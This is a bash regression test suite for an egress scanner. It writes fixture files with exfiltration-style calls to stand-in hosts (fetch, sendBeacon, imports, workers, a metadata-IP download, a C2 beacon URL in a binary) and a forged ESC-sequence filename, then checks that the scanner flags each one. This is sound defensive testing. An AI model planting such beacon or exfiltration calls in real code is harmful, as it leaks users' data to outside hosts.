#!/usr/bin/env bash
# Regression fixtures for scan-egress.sh. Builds a throwaway tree with each class the review
# flagged and asserts the scanner's exit code + that the right paths are flagged. Exit 0 = all
# pass. Every class is exercised in ISOLATION so an assertion cannot be satisfied by a coupled
# violation (review finding: the old binary test passed only because other violations existed).
#
# NOTE: this control file assembles every fixture URL from fragments at runtime, so the SHIPPED
# source carries no literal `scheme://host`, no `curl|wget|fetch(` pipe, for the integrity
# manifest classifier to flag (finding #6: test fixtures must not poison the release path). The
# throwaway tree still receives real, scannable URLs; only this source is inert.
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SCAN="$HERE/scan-egress.sh"
pass=0; fail=0
ok(){ pass=$((pass+1)); printf '  ok    %s\n' "$1"; }
no(){ fail=$((fail+1)); printf '  FAIL  %s\n' "$1"; }

T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT

# assemble scheme + '://' from fragments so no literal URL token appears in THIS file
_s='ht'; _t='tp'; _x='s'; _sep=':'; _sl='/'
J="${_sep}${_sl}${_sl}"                                          # ://  (assembled)
url_https(){ printf '%s%s%s%s%s' "$_s" "$_t" "$_x" "$J" "$1"; }  # https://<host/path>
url_http(){  printf '%s%s%s%s'   "$_s" "$_t"       "$J" "$1"; }  # http://<host/path>

# --- build the fixtures (each class isolated in its own dir) ---
mkdir -p "$T/clean" "$T/waived" "$T/dirty" "$T/binonly" "$T/binembed" "$T/symonly" "$T/nlname"

# clean: no egress at all
printf '# docs\nnothing external here\n'                          > "$T/clean/readme.md"
printf 'body{color:red}\n'                                        > "$T/clean/style.css"
printf '<svg xmlns="%s"></svg>\n' "$(url_http www.w3.org/2000/svg)" > "$T/clean/icon.svg"   # non-fetching xmlns

# waived: a real egress with a bounded trailing waiver -> passes
printf 'const u="%s"; /* egress-ok */\n' "$(url_https api.example.invalid)" > "$T/waived/app.js"

# dirty: extensionless + UPPERCASE + symlink + binary + benign, all together
printf '#!/bin/sh\ndownload %s\n' "$(url_https evil.example.invalid/x)"   > "$T/dirty/deploy"   # extensionless
chmod +x "$T/dirty/deploy"
printf '#!/bin/sh\ndownload %s\n' "$(url_http 169.254.169.254/x)"         > "$T/dirty/RUN.SH"    # UPPERCASE ext
printf 'ok\n'                                                             > "$T/dirty/note.txt"
ln -s /etc/hosts "$T/dirty/link-out"                                                             # symlink escape
printf '\x7fELF\x01\x02\x03\x00\x00binary\x00\xff\xfe'                    > "$T/dirty/blob.bin"  # benign binary

# isolation: a benign binary ALONE (proves a binary fails closed on its own, and no set -u crash)
printf '\x7fELF\x00\x01\x02\xff\xfe'                                      > "$T/binonly/only.bin"
# isolation: a binary whose STRINGS embed a URL (proves scan-egress greps binary strings)
printf 'PRE\x00%s\x00POST\n' "$(url_https c2.example.invalid/beacon)"     > "$T/binembed/embed.bin"
# isolation: a symlink ALONE (proves symlink-only input does not crash under set -u)
ln -s /etc/hosts "$T/symonly/only-link"
# isolation: a filename CONTAINING A NEWLINE with an egress (proves NUL-safe find enumeration)
printf 'x %s\n' "$(url_https nl.example.invalid/x)"                       > "$T/nlname/we"$'\n'"ird.txt"

# --- 2.0.3 self-red-team fixtures (adversarial panel) ---
mkdir -p "$T/pr_srcset" "$T/pr_poster" "$T/pr_meta" "$T/laundry" "$T/webrtc" "$T/localok" "$T/fifo" "$T/binurl"
# protocol-relative //host in browser-auto-fetched contexts (bare '//', assembled to stay inert here).
# R6 finding #4: each vector gets its OWN isolated dir so one hit can never mask another.
_j="${_sep}${_sl}${_sl}"
printf '<img srcset="%scdn.evil.invalid/a.png 2x">\n' "${_sl}${_sl}"                 > "$T/pr_srcset/i.html"
printf '<video poster="%sposter.evil.invalid/f.jpg"></video>\n' "${_sl}${_sl}"       > "$T/pr_poster/i.html"
printf '<meta http-equiv="refresh" content="0;url=%smeta.evil.invalid/next">\n' "${_sl}${_sl}" > "$T/pr_meta/i.html"
# DOCTYPE-wrapped REAL url must NOT be laundered (the old <!DOCTYPE ...> strip ate it) -> must FAIL
printf 'var a="<!doctype"; var u="%s"; var b=">";\n' "$(url_https evil.invalid/steal)" > "$T/laundry/app.js"
# WebRTC stun: scheme (inert literal — no http prefix for the manifest classifier)
printf 'new RTCPeerConnection({iceServers:[{urls:"stun:stun.evil.invalid:3478"}]});\n' > "$T/webrtc/app.js"
# same-origin / data: fetch and a README that merely NAMES the APIs are BENIGN -> must PASS
printf 'fetch("./config.json"); new XMLHttpRequest(); fetch("data:text/plain,ok");\n' > "$T/localok/app.js"
printf '# Docs\nUses the fetch() API and XMLHttpRequest for local data.\n' > "$T/localok/README.md"
# a FIFO must fail closed and NEVER be read (reading it would hang the scanner)
mkfifo "$T/fifo/pipe" 2>/dev/null || true
printf 'ok\n' > "$T/fifo/ok.txt"
# a binary carrying an embedded URL must FAIL even when glob-waived (no laundering)
printf 'PRE\x00%s\x00POST\n' "$(url_https tracker.invalid/beacon)" > "$T/binurl/tracker.bin"

# --- 2.0.3-r4 fixtures (Codex round-3 exact-head), each class ISOLATED in its own dir ---
_pr="${_sl}${_sl}"                                              # protocol-relative '//' (assembled)
mkdir -p "$T/nsfetch" "$T/nsvar" "$T/nssvg" "$T/ppm" \
         "$T/objdata" "$T/beacon" "$T/xhropen" "$T/srcset2" "$T/leadws" "$T/mlattr" "$T/mlfetch" \
         "$T/unreadbin" "$T/travtree/sub/secret"
# finding 1: xmlns must NOT launder a real fetch/variable; only a genuine in-tag xmlns is benign
printf 'fetch(xmlns="%s")\n' "$(url_https exfil.invalid/x)"           > "$T/nsfetch/app.js"
printf 'const xmlns="%s"; fetch(xmlns)\n' "$(url_https exfil.invalid/y)" > "$T/nsvar/app.js"
printf '<svg xmlns="%s"></svg>\n' "$(url_http www.w3.org/2000/svg)"   > "$T/nssvg/icon.svg"
# finding 4: a NUL-free P6 Netpbm rawbits binary (control bytes, no NUL) must classify BINARY
{ printf 'P6\n2 2\n255\n'; printf '\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c'; } > "$T/ppm/img.ppm"
# finding 5: protocol-relative //host in each fetching context claimed by SKILL.md, isolated
printf '<object data="%sevil.invalid/x.swf"></object>\n' "$_pr"       > "$T/objdata/i.html"
printf 'navigator.sendBeacon("%sevil.invalid/b");\n' "$_pr"           > "$T/beacon/a.js"
printf 'var x=new XMLHttpRequest(); x.open("GET","%sevil.invalid/d");\n' "$_pr" > "$T/xhropen/a.js"
printf '<img srcset="%sa.invalid/1.png 1x, %sb.invalid/2.png 2x">\n' "$_pr" "$_pr" > "$T/srcset2/i.html"
mkdir -p "$T/srcset_a" "$T/srcset_b"                          # R6 #4: each candidate ALSO isolated alone
printf '<img srcset="%ssa.invalid/1.png 1x">\n' "$_pr"                > "$T/srcset_a/i.html"
printf '<img srcset="%ssb.invalid/2.png 2x">\n' "$_pr"                > "$T/srcset_b/i.html"
printf '<a href=" %sevil.invalid/lead">x</a>\n' "$_pr"               > "$T/leadws/i.html"
printf '<img\n  src\n  ="%sevil.invalid/ml">\n' "$_pr"               > "$T/mlattr/i.html"   # multiline attr
printf 'fetch(\n  "%sevil.invalid/mlf")\n' "$_pr"                    > "$T/mlfetch/a.js"    # multiline literal
# finding 2 & 3: unreadable file / traversal error fixtures (chmod applied at check time, root-skipped)
printf 'PRE\x00%s\x00POST\n' "$(url_https c2.invalid/x)"             > "$T/unreadbin/font.woff2"
printf 'clean docs\n'                                                > "$T/travtree/visible.txt"
printf 'download %s\n' "$(url_https evil.invalid/x)"                 > "$T/travtree/sub/secret/hidden.sh"

# --- 2.0.3-r5 fixtures (Codex round-4 exact-head), each class ISOLATED in its own dir ---
# shellcheck disable=SC1003  # not an escaped quote: exactly two literal backslash characters
_bs='\\'
mkdir -p "$T/latenul" "$T/ipv6" "$T/esmod" "$T/expfrom" "$T/btfetch" "$T/worker" "$T/swreg" \
         "$T/locnav" "$T/bslash" "$T/jsprop" "$T/fpsrc" "$T/fpdata" "$T/fpdiv"
# finding 1: text-classified file (first 8K printable) with a LATE NUL + real URL — the NUL must not
# be able to collapse the counts channel into a false PASS (counts ride a separate trusted file)
head -c 9000 /dev/zero | LC_ALL=C tr '\0' 'A'                        > "$T/latenul/late.js"
printf '\000%s\n' "$(url_https exfil.invalid/steal)"                >> "$T/latenul/late.js"
# finding 7: each direct-miss vector isolated
printf '<img src="%s[2001:db8::1]/x.png">\n' "$_pr"                  > "$T/ipv6/i.html"      # IPv6 literal host
printf 'import x from "%sevil.invalid/mod.js";\n' "$_pr"             > "$T/esmod/a.js"       # static import
printf 'export { a } from "%sevil.invalid/re.js";\n' "$_pr"          > "$T/expfrom/a.js"     # export-from
# shellcheck disable=SC2016  # the backticks are JS template-literal SYNTAX and must stay literal
printf 'fetch(`%sevil.invalid/bt`);\n' "$_pr"                        > "$T/btfetch/a.js"     # backtick template
printf 'new Worker("%sevil.invalid/w.js");\n' "$_pr"                 > "$T/worker/a.js"      # dedicated worker
printf 'navigator.serviceWorker.register("%sevil.invalid/sw.js");\n' "$_pr" > "$T/swreg/a.js"
printf 'location.assign("%sevil.invalid/nav");\n' "$_pr"             > "$T/locnav/a.js"
printf '<a href="%s%s%s%s%sevil.invalid/bs">x</a>\n' "$_s" "$_t" "$_x" "$_sep" "$_bs" > "$T/bslash/i.html"  # https:\\host
# tag-bounding must NOT lose the JS property-assignment vector (dot-prefixed .src=)
printf 'img.src = "%sevil.invalid/js";\n' "$_pr"                     > "$T/jsprop/a.js"
# finding 8: material false positives — plain JS vars and a non-fetching div data attribute
printf "const src='%sdocs';\n" "$_pr"                                > "$T/fpsrc/a.js"
printf "const data='%sdocs';\n" "$_pr"                               > "$T/fpdata/a.js"
printf "<div data='%sdocs'>x</div>\n" "$_pr"                         > "$T/fpdiv/i.html"
# nearby FP found while red-teaming: BOTH xmlns declarations in one tag are benign namespaces
mkdir -p "$T/ns2"
printf '<svg xmlns="%s" xmlns:xlink="%s"></svg>\n' \
  "$(url_http www.w3.org/2000/svg)" "$(url_http www.w3.org/1999/xlink)" > "$T/ns2/i.svg"

# --- 2.0.3-r6 fixtures (Codex round-5 exact-head), each class ISOLATED ---
# finding S2: valid COMPACT ES modules (no whitespace after the keyword) must be caught
mkdir -p "$T/r6imp" "$T/r6exp" "$T/r6star" "$T/r6bare" "$T/r6konst"
printf 'import{a}from"%sevil.invalid/m"\n' "$_pr"                     > "$T/r6imp/a.js"     # import{a}from
printf 'export{a}from"%sevil.invalid/m"\n' "$_pr"                     > "$T/r6exp/a.js"     # export{a}from
printf 'import*as n from"%sevil.invalid/m"\n' "$_pr"                  > "$T/r6star/a.js"    # import*as
printf 'import"%sevil.invalid/side"\n' "$_pr"                         > "$T/r6bare/a.js"    # bare import"//h"
printf 'export const x = "%sdocs";\n' "$_pr"                          > "$T/r6konst/a.js"   # string const, NOT a fetch
# finding S3: a filename carrying an ESC + forged text must be sanitized in every diagnostic
mkdir -p "$T/r6esc"
ln -s /etc/hosts "$T/r6esc/$(printf 'evil\033[32mFORGED-PASS\033[0m')" 2>/dev/null || true

check() { # <label> <want-exit> <needle-or-empty> -- <scan args...>
  local label="$1" want="$2" needle="$3"; shift 3
  local out got
  out="$(bash "$SCAN" "$@" 2>&1)"; got=$?
  if [ "$got" != "$want" ]; then no "$label (exit want=$want got=$got)"; return; fi
  if [ -n "$needle" ] && ! printf '%s' "$out" | grep -q -- "$needle"; then no "$label (missing '$needle')"; return; fi
  ok "$label"
}

check_count() { # <label> <want-exit> <want-EGRESS-line-count> -- <scan args...>
  # asserts the EXACT number of EGRESS records, so on a multi-candidate line one detected hit can
  # never mask a missed sibling (R6 finding #4).
  local label="$1" want="$2" wantc="$3"; shift 3
  local out got cnt
  out="$(bash "$SCAN" "$@" 2>&1)"; got=$?
  cnt="$(printf '%s\n' "$out" | grep -c '^EGRESS ')"
  if [ "$got" != "$want" ]; then no "$label (exit want=$want got=$got)"; return; fi
  if [ "$cnt" != "$wantc" ]; then no "$label (EGRESS count want=$wantc got=$cnt)"; return; fi
  ok "$label"
}

echo "== scan-egress regressions =="
check "clean tree passes"                       0 ""                  "$T/clean"
check "non-fetching xmlns is not egress"        0 "NSURI"             "$T/clean"
check "waived text passes"                      0 "WAIVED"            "$T/waived"
check "extensionless script detected"           1 "deploy"            "$T/dirty"
check "UPPERCASE .SH detected"                  1 "RUN.SH"            "$T/dirty"
check "symlink flagged"                         1 "SYMLINK"           "$T/dirty"
check "binary fails closed in isolation"        1 "UNSCANNED(binary)" "$T/binonly"
check "binary-only no set -u crash"             1 "only.bin"          "$T/binonly"
check "symlink-only no set -u crash"            1 "SYMLINK"           "$T/symonly"
check "binary embedded URL is scanned + fails"  1 "EGRESS(binary)"    "$T/binembed"
check "newline-in-filename still enumerated"    1 "EGRESS"            "$T/nlname"
check "binary waived by --allow-binary passes"  0 "WAIVED-BINARY"     --allow-binary '*only.bin' "$T/binonly"
check "unmatched --allow-binary still fails"    1 "UNSCANNED(binary)" --allow-binary '*.png' "$T/binonly"

echo "== 2.0.3 self-red-team (adversarial panel) =="
check "protocol-relative srcset fails (isolated)" 1 "cdn.evil.invalid"  "$T/pr_srcset"
check "protocol-relative poster fails (isolated)" 1 "poster.evil.invalid" "$T/pr_poster"
check "meta-refresh protocol-relative fails"     1 "meta.evil.invalid" "$T/pr_meta"
check "DOCTYPE wrapper does not launder a URL"   1 "EGRESS"            "$T/laundry"
check "WebRTC stun: scheme detected"             1 "EGRESS"            "$T/webrtc"
check "same-origin/data fetch + README pass"     0 ""                 "$T/localok"
check "FIFO in dir fails closed (no hang)"        1 "SPECIAL"           "$T/fifo"
check "direct FIFO target fails closed"          1 "SPECIAL"           "$T/fifo/pipe"
check "embedded-URL binary fails even if waived" 1 "EGRESS(binary)"    --allow-binary '*' "$T/binurl"

echo "== 2.0.3-r4 (Codex round-3 exact-head) =="
check "xmlns cannot launder a real fetch()"      1 "EGRESS"            "$T/nsfetch"
check "xmlns variable is real egress"            1 "EGRESS"            "$T/nsvar"
check "genuine in-tag xmlns still benign"        0 "NSURI"             "$T/nssvg"
check "NUL-free P6 rawbits classified binary"    1 "UNSCANNED(binary)" "$T/ppm"
check "object data protocol-relative fails"      1 "EGRESS"            "$T/objdata"
check "navigator.sendBeacon fails"               1 "EGRESS"            "$T/beacon"
check "XHR.open URL argument fails"              1 "EGRESS"            "$T/xhropen"
check_count "both srcset candidates flagged (count==2)" 1 2            "$T/srcset2"
check "srcset candidate A isolated fails"        1 "sa.invalid/1.png"  "$T/srcset_a"
check "srcset candidate B isolated fails"        1 "sb.invalid/2.png"  "$T/srcset_b"
check "leading whitespace in quoted attr fails"  1 "EGRESS"            "$T/leadws"
check "multiline attribute fails"                1 "EGRESS"            "$T/mlattr"
check "multiline fetch literal fails"            1 "EGRESS"            "$T/mlfetch"
echo "== 2.0.3-r5 (Codex round-4 exact-head) =="
check "late NUL cannot collapse the counts channel" 1 "EGRESS"       "$T/latenul"
check "protocol-relative IPv6 literal host fails"   1 "EGRESS"       "$T/ipv6"
check "static import from external fails"           1 "EGRESS"       "$T/esmod"
check "export-from external fails"                  1 "EGRESS"       "$T/expfrom"
check "backtick-template fetch fails"               1 "EGRESS"       "$T/btfetch"
check "new Worker external script fails"            1 "EGRESS"       "$T/worker"
check "serviceWorker.register fails"                1 "EGRESS"       "$T/swreg"
check "location.assign navigation fails"            1 "EGRESS"       "$T/locnav"
check "backslash-normalized https URL fails"        1 "EGRESS"       "$T/bslash"
check "dot-prefixed .src property still fails"      1 "EGRESS"       "$T/jsprop"
check "plain JS src variable is not egress"         0 ""             "$T/fpsrc"
check "plain JS data variable is not egress"        0 ""             "$T/fpdata"
check "div data attribute is not egress"            0 ""             "$T/fpdiv"
check "second xmlns in one tag is still benign"     0 "NSURI"        "$T/ns2"
# unreadable file / traversal error can only be simulated as non-root
if [ "$(id -u)" -ne 0 ]; then
  chmod 000 "$T/unreadbin/font.woff2"
  check "unreadable URL-binary fails despite waiver" 1 "UNREADABLE" --allow-binary '*.woff2' "$T/unreadbin"
  chmod 644 "$T/unreadbin/font.woff2"
  chmod 000 "$T/travtree/sub/secret"
  check "traversal error fails the tree closed"      1 "TRAVERSAL"  "$T/travtree"
  chmod 755 "$T/travtree/sub/secret"
else
  printf '  skip  unreadable-file + traversal (running as root — cannot simulate unreadable)\n'
fi

echo "== 2.0.3-r6 (Codex round-5 exact-head) =="
# S2: compact ES module forms are caught; a string constant with no `from` stays clean
check "compact import{a}from is caught"          1 "EGRESS"       "$T/r6imp"
check "compact export{a}from is caught"          1 "EGRESS"       "$T/r6exp"
check "compact import*as ... from is caught"     1 "EGRESS"       "$T/r6star"
check "bare side-effect import is caught"        1 "EGRESS"       "$T/r6bare"
check "export const string is NOT egress"        0 ""             "$T/r6konst"
# S3: an ESC-bearing filename must appear neutralized (no raw ESC byte) in the diagnostic
r6esc_out="$(bash "$SCAN" "$T/r6esc" 2>&1)"
if printf '%s' "$r6esc_out" | LC_ALL=C grep -q "$(printf '\033')"; then
  no "S3 control byte in path is sanitized (raw ESC leaked)"
else
  ok "S3 control byte in path is sanitized (raw ESC leaked)"
fi
# S3 also: the sanitized diagnostic still visibly reports the symlink with '?' placeholders
if printf '%s' "$r6esc_out" | grep -q 'SYMLINK .*FORGED-PASS'; then
  ok "S3 sanitized SYMLINK still shown"
else
  no "S3 sanitized SYMLINK still shown"
fi

# S1: unit-test the REAL trusted-counts validator lifted from the shipped scanner. A honest canonical
# record is accepted; every producer/runtime fault (leading-zero/octal, overflow, extra line, no
# trailing newline, trailing garbage, NUL, wrong arity, non-ASCII) is REJECTED so the gate fails closed.
CFNS="$(mktemp)"
awk '
  $0 ~ /^is_canon_count\(\) \{/ {p=1}
  $0 ~ /^validate_counts_file\(\) \{/ {p=1}
  p {print}
  p && $0=="}" {p=0}
' "$SCAN" > "$CFNS"
# shellcheck source=/dev/null
. "$CFNS"
CT="$(mktemp -d)"
counts_accepts() { printf '%b' "$2" > "$CT/c"; if validate_counts_file "$CT/c" >/dev/null; then ok "$1"; else no "$1 (rejected a canonical record)"; fi; }
counts_rejects() { printf '%b' "$2" > "$CT/c"; if validate_counts_file "$CT/c" >/dev/null; then no "$1 (accepted a fault -> would fail OPEN)"; else ok "$1"; fi; }
counts_accepts "S1 counts accept 0 0 0"          '0 0 0\n'
counts_accepts "S1 counts accept 3 1 2"          '3 1 2\n'
counts_accepts "S1 counts accept 9-digit max"    '999999999 0 0\n'
counts_rejects "S1 counts reject leading-zero 08" '08 0 0\n'
counts_rejects "S1 counts reject overflow"       '99999999999999999999 0 0\n'
counts_rejects "S1 counts reject 10-digit field" '1000000000 0 0\n'
counts_rejects "S1 counts reject extra line"     '0 0 0\n99 0 0\n'
counts_rejects "S1 counts reject no newline"     '0 0 0'
counts_rejects "S1 counts reject trailing junk"  '0 0 0\nx'
counts_rejects "S1 counts reject embedded NUL"   '0 0 0\000\n'
counts_rejects "S1 counts reject 2 fields"       '0 0\n'
counts_rejects "S1 counts reject 4 fields"       '0 0 0 0\n'
counts_rejects "S1 counts reject non-ASCII"      '0 0 \303\251\n'
rm -rf "$CT" "$CFNS"

echo
echo "RESULT pass=$pass fail=$fail"
[ "$fail" -eq 0 ]
